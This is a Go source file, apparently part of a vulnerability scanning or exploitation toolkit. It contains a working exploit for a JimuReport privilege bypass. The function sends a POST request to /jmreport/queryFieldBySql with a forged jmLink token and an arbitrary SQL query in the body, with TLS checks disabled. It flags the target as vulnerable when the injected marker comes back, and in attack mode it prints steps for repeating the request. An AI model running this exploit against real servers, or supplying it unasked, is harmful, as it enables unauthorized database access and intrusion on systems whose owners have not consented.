package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func Jmreport_PrivilegeBypass(url string, Attack bool) error {
	payload := `{
 "sql":"select 'ycxhhh'"
}`

	payload = strings.ReplaceAll(payload, "\n", "\r\n")
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/json")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body), "\"fieldName\":\"ycxhhh\"") {
		fmt.Println("[*]Jmreport_PrivilegeBypass : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123，并传入请求体`{\n \"sql\":\"select 'ycxhhh'\"\n}`\n")
		}
	}

	defer response.Body.Close()

	return nil
}